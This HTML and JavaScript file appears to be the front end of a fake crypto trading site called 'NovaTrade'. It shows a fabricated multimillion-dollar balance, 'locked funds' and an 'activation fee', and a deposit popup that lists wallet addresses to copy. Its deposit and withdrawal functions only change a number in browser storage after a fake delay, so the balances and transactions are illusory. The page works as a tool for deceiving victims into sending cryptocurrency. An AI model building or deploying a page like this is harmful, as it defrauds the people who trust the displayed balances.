<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NovaTrade Trading</title>
<style>
/* ================= GLOBAL ================= */
body {
  margin:0;
  background:#0b0f14;
  font-family:system-ui;
  color:white;
  display:flex;
  flex-direction:column;
  align-items:center;
  min-height:100vh;
  padding:20px;
}
.card {
  background:#111827;
  padding:20px;
  border-radius:18px;
  width:100%;
  max-width:400px;
  box-shadow:0 0 30px rgba(0,0,0,.4);
  margin-bottom:20px;
}
input, select {
  width:100%;
  padding:12px;
  margin:10px 0;
  background:#0b0f14;
  border:1px solid #263041;
  border-radius:10px;
  color:white;
}
button {
  width:100%;
  padding:14px;
  border:none;
  border-radius:12px;
  background:#22c55e;
  color:white;
  font-weight:700;
  cursor:pointer;
  transition:.3s;
}
button:disabled {
  background:#555;
  color:#ccc;
  cursor:not-allowed;
}
.small {
  opacity:.7;
  font-size:13px;
  margin-top:10px;
  text-align:center;
}
.loading-dots span {
  animation:blink 1.4s infinite;
  font-weight:bold;
}
.loading-dots span:nth-child(2){animation-delay:.2s;}
.loading-dots span:nth-child(3){animation-delay:.4s;}
@keyframes blink {0%,80%,100%{opacity:0}40%{opacity:1}}

/* ================= POPUP ================= */
.popup{
  position:fixed;
  top:0;left:0;
  width:100%;height:100%;
  background:rgba(0,0,0,.7);
  display:none;
  justify-content:center;
  align-items:center;
}
.popup-box{
  background:#111827;
  padding:20px;
  width:90%;
  max-width:400px;
  border-radius:12px;
  text-align:center;
  color:white;
}
.wallet-box{
  display:flex;
  justify-content:space-between;
  align-items:center;
  background:#0b0f14;
  padding:8px;
  border-radius:6px;
  margin-bottom:10px;
  font-size:12px;
  word-break:break-all;
}
.copy-btn{
  cursor:pointer;
  font-size:14px;
  color:#22c55e;
}

/* ================= LIVE BALANCE ================= */
.balance-up{ color:#00c087; transition:.3s; }
.balance-down{ color:#f6465d; transition:.3s; }
#balance{ font-variant-numeric: tabular-nums; }
</style>
</head>
<body>

<div class="card">
<h2>WALLET CONNECTED</h2>
<p>:VERIFYING... </p>
<p>LOCKED: $00</p>
<button onclick="toggleTheme()">LOCKED FUNDS</button>
</div>

<div class="card">
<h3>Total Activation Fee Balance:</h3>
<h2 id="balance">$00</h2>

<select id="pair">
<option>BTC/USDT</option>
<option>ETH/USDT</option>
<option>SOL/USDT</option>
<option>ADA/USDT</option>
<option>XRP/USDT</option>
<option>DOGE/USDT</option>
<option>DOT/USDT</option>
<option>LTC/USDT</option>
<option>AVAX/USDT</option>
<option>TRX/USDT</option>
</select>

<button onclick="cancelTrade()">CANCEL Trade</button>
</div>

<div class="card">
<h3>Deposit</h3>
<button onclick="openDeposit()">Make Deposit</button>
<p id="depositMsg"></p>
</div>

<div class="card">
<h3>Withdrawal</h3>
<input type="number" id="withdrawAmount" placeholder="Enter amount">
<button id="withdrawBtn" onclick="unlockWithdrawal()">Unlock Withdrawal</button>
<p id="withdrawMsg"></p>
</div>

<div class="card">
<h3>Transaction History</h3>
<ul id="history"></ul>
</div>

<div class="card nav">
<button onclick="redirectWithdrawal()">Withdrawal Page</button>
<button onclick="redirectHome()">Dashboard</button>
</div>

<!-- ================= POPUP ================= -->
<div class="popup" id="depositPopup">
<div class="popup-box">
<h3>Select Network</h3>
<select id="networkSelect" onchange="updateWallet()">
<option value="USDT-ERC20">USDT (ERC20)</option>
<option value="USDT-TRC20">USDT (TRC20)</option>
<option value="SOL">SOL</option>
<option value="BTC">BTC</option>
<option value="BNB">BNB</option>
</select>

<div class="wallet-box">
<span id="walletAddress"></span>
<span class="copy-btn" onclick="copyWallet()">📋</span>
</div>

<input type="number" id="depositAmount" placeholder="Enter amount">
<button onclick="SuccessDeposit()">Confirm Deposit</button>
<div id="depositLoading"></div>
<button onclick="closeDeposit()">Close</button>
</div>
</div>

<script>
// ================= THEME =================
function toggleTheme(){
  document.body.classList.toggle('dark');
  localStorage.setItem('theme',document.body.className);
}
document.addEventListener('DOMContentLoaded',()=>{
  const theme = localStorage.getItem('theme');
  if(theme) document.body.className = theme;
});

// ================= BALANCE =================
let balanceEl = document.getElementById("balance");
let historyEl = document.getElementById("history");
let balance = parseFloat(localStorage.getItem("balance"))||7093782.88;
balanceEl.innerText="$"+balance.toFixed(2);

// ================= WALLET =================
let wallets = {
 "USDT-ERC20":"0xA7f9C12D4E5F678901234567890ABCDEF1234567",
 "USDT-TRC20":"TXYz123456789ABCDEFGHJKLMNPQRST",
 "SOL":"9xQeWvG816bUx9EPfC9w8PqgkF5abcXYZ1234567",
 "BTC":"bc1qxy2kgdygjrsqtzq2n0yr5...wlh",
 "BNB":"bnb1grpf0955h0ykzq3ar5nmum7y6gdfl6lxfn46h2"
};

function openDeposit(){
  document.getElementById("depositPopup").style.display="flex";
  updateWallet();
}
function closeDeposit(){
  document.getElementById("depositPopup").style.display="none";
}
function updateWallet(){
  document.getElementById("walletAddress").innerText =
    wallets[document.getElementById("networkSelect").value];
}
function copyWallet(){
  navigator.clipboard.writeText(
    document.getElementById("walletAddress").innerText
  );
  alert("Wallet Address Copied!");
}

function SuccessDeposit(){
 let amount=parseFloat(document.getElementById("depositAmount").value);
 if(!amount||amount<=0) return;

 document.getElementById("depositLoading").innerText="Confirming deposit...";
 setTimeout(()=>{
   balance += amount;
   localStorage.setItem("balance",balance);
   saveHistory("Deposit +"+amount);
   updateBalanceEl();
   document.getElementById("depositLoading").innerText="Deposit Successful!";
 },3000);
}

// ================= WITHDRAW =================
function unlockWithdrawal(){
 let amount=parseFloat(document.getElementById("withdrawAmount").value);
 if(!amount || amount<=0 || amount>balance){
   document.getElementById("withdrawMsg").innerText="Invalid withdrawal amount.";
   return;
 }

 let btn=document.getElementById("withdrawBtn");
 btn.disabled=true;
 btn.innerText="Processing...";

 setTimeout(()=>{
   balance-=amount;
   localStorage.setItem("balance",balance);
   saveHistory("Withdrawal -"+amount);
   updateBalanceEl();
   btn.innerText="Withdrawal Successful";
   setTimeout(()=>{
     btn.innerText="Unlock Withdrawal";
     btn.disabled=false;
   },1500);
 },3000);
}

// ================= CANCEL TRADE =================
function cancelTrade(){
  balance = 00;
  localStorage.setItem("balance", balance);
  updateBalanceEl();
  saveHistory("Trade CANCELLED | Balance Reset to $00");
}

// ================= HISTORY =================
function saveHistory(text){
 let list = JSON.parse(localStorage.getItem("history"))||[];
 list.push(text+" | "+new Date().toLocaleTimeString());
 localStorage.setItem("history",JSON.stringify(list));
 loadHistory();
}
function loadHistory(){
 historyEl.innerHTML="";
 let list = JSON.parse(localStorage.getItem("history"))||[];
 list.forEach(item=>historyEl.innerHTML+=`<li>${item}</li>`);
}
loadHistory();

function updateBalanceEl(){
  balanceEl.innerText="$"+balance.toFixed(2);
}

// ================= REDIRECT BUTTONS =================
function redirectWithdrawal(){
 document.body.innerHTML="<div style='color:white;text-align:center;margin-top:50vh'>Redirecting<span class='loading-dots'><span>.</span><span>.</span><span>.</span></span></div>";
 setTimeout(()=>location="withdrawal.html",2000);
}
function redirectHome(){
 document.body.innerHTML="<div style='color:white;text-align:center;margin-top:50vh'>Redirecting<span class='loading-dots'><span>.</span><span>.</span><span>.</span></span></div>";
 setTimeout(()=>location="home.html",2000);
}
</script>
</body>
</html>
